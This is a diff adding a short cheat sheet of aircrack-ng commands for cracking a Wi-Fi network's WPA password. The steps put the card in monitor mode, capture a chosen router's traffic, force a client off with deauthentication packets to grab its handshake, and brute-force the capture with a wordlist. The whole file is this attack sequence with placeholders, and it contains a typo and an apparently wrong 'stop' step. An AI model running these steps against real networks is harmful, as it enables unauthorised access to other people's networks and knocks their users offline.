@@ -1,0 +1,6 @@
+airmon-ng
+airmon-ng stop wlan0
+airodump-ng wlan0
+airodump-ng -c [chanel ] --write [tenfile] --bssid [routerID] wlan0
+aireplay-ng --deauth 5 -a [routerID] -c [OtherBssid] wlan0
+aircrack-ng -w [passwordlist] -b [routerID] [file.cap]
